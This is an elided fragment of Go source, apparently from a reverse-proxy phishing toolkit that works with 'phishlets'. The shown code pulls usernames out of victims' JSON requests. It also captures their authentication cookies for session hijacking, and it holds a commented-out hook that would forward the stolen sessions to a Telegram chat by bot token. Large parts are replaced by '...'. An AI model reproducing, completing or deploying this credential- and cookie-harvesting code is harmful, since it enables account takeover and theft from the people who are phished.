				...
				if pl != nil && ps.SessionId != "" {
					...
					if err == nil {
						...
						if json_re.MatchString(contentType) {
							...
							for _, cp := range pl.custom {
								if cp.tp == "json" {
									...
									if cm != nil && len(cm) > 1 {
										...
										//trigger = 1
										if cp.key_s == "username" {
											updatePhishlets(cm[1], pl)
										}
							...
							//if trigger == 1 {
							//	readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken, allSessions)
							//}
					...
					if at != nil {
						...
						if ok && (s.IsAuthUrl || !s.IsDone) {
							if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) { // cookies with empty values or expired cookies are of no interest to us
								...
								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires, ck.SameSite)
							}
						}
					}
				}
